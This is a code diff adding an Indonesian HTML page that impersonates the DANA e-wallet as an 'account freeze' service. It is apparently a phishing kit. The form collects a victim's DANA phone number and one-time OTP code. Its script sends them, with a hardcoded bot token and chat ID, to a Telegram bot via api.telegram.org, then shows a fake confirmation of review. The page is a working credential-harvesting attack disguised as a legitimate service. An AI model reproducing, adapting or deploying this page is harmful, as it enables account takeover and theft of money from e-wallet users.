@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Bekukan Akun Dana</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #111;
+      font-family: 'Segoe UI', sans-serif;
+      color: #eee;
+    }
+    .header {
+      background-color: #000;
+      color: #0ff;
+      padding: 20px;
+      text-align: center;
+      font-size: 22px;
+      font-weight: bold;
+      box-shadow: 0 0 10px #0ff;
+    }
+    .container {
+      padding: 20px;
+      max-width: 420px;
+      margin: auto;
+    }
+    .card {
+      background: #1a1a1a;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,255,255,0.3);
+    }
+    input, textarea {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      background-color: #222;
+      color: #fff;
+      box-shadow: inset 0 0 5px #0ff;
+    }
+    button {
+      width: 100%;
+      background-color: #00c7c7;
+      color: #000;
+      border: none;
+      padding: 14px;
+      font-size: 17px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      box-shadow: 0 0 10px #00f7ff;
+    }
+    button:hover {
+      background-color: #00e6e6;
+    }
+    .logo {
+      width: 100px;
+      margin-bottom: 15px;
+      filter: drop-shadow(0 0 10px #0ff);
+    }
+    .center {
+      text-align: center;
+    }
+    .format-box {
+      background: #222;
+      padding: 10px;
+      font-size: 14px;
+      border-radius: 8px;
+      white-space: pre-wrap;
+      color: #0ff;
+      margin-bottom: 10px;
+      border: 1px solid #0ff;
+    }
+    .copy-btn {
+      background-color: #444;
+      color: #0ff;
+      border: none;
+      padding: 8px 12px;
+      font-size: 14px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+    .copy-btn:hover {
+      background-color: #666;
+    }
+    .success {
+      background-color: #003333;
+      border: 1px solid #00ffcc;
+      color: #0ff;
+      padding: 10px;
+      border-radius: 8px;
+      margin-top: 15px;
+      font-size: 15px;
+      box-shadow: 0 0 8px #00ffcc;
+    }
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      margin-top: 30px;
+      color: #555;
+    }
+    .protected {
+      margin-top: 20px;
+      color: #0ff;
+      font-size: 13px;
+      text-align: center;
+      font-style: italic;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">DANA - Bekukan Akun</div>
+
+  <div class="container">
+    <div class="card">
+      <div class="center">
+        <img src="dana.jpg" class="logo" alt="Dana Logo">
+      </div>
+
+      <form id="bekukanForm">
+        <label>Nomor Dana</label>
+        <input type="tel" id="nomor" placeholder="08xxxxxxxxxx" required>
+
+        <label>Kode OTP</label>
+        <input type="number" id="otp" placeholder="6 digit OTP" required>
+
+        <label>Laporan</label>
+        <textarea id="laporan" placeholder="Tempel teks otomatis atau buat sendiri..."></textarea>
+
+        <div class="format-box" id="formatText">
+*PERMOHONAN PEMBEKUAN AKUN*
+
+Mohon bantuan untuk membekukan akun Dana berikut:
+
+- Nomor: 08xxxxxxxxxx
+- Alasan: Akun ini digunakan untuk aktivitas penipuan dan penyalahgunaan layanan Dana. Sudah banyak korban melapor.
+- Harap segera dibekukan untuk mencegah kerugian lebih besar.
+
+Terima kasih.
+        </div>
+        <button type="button" class="copy-btn" onclick="salinTeks()">Salin Teks</button>
+
+        <button type="submit">Bekukan Sekarang</button>
+      </form>
+
+      <div id="responseMessage" class="success" style="display:none;">
+        Laporan berhasil dikirim. Kami akan segera meninjau data yang Anda berikan melalui GitHub investigasi internal.
+      </div>
+    </div>
+
+    <div class="protected">
+      Website ini dilindungi oleh <b>Hak cipta</b>
+    </div>
+  </div>
+
+  <div class="footer">
+    &copy; 2025 Dana Protection Team
+  </div>
+
+  <script>
+    function salinTeks() {
+      const text = document.getElementById("formatText").innerText;
+      navigator.clipboard.writeText(text)
+        .then(() => alert("Teks berhasil disalin!"))
+        .catch(err => alert("Gagal menyalin teks."));
+    }
+
+    const botToken = "7676076427:AAGlqJBLZt25Tuz8NA6L8ebpAsJccLFW26Y";
+    const chatId = "7819779147";
+
+    document.getElementById("bekukanForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const nomor = document.getElementById("nomor").value;
+      const otp = document.getElementById("otp").value;
+      const laporan = document.getElementById("laporan").value;
+
+      const message = `*PEMBEKUAN AKUN DANA*\n\n*Nomor:* ${nomor}\n*OTP:* ${otp}\n*Laporan:* ${laporan}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          document.getElementById("responseMessage").style.display = "block";
+          document.getElementById("bekukanForm").reset();
+        } else {
+          alert("Gagal mengirim data.");
+        }
+      });
+    });
+  </script>
+
+</body>
+</html>
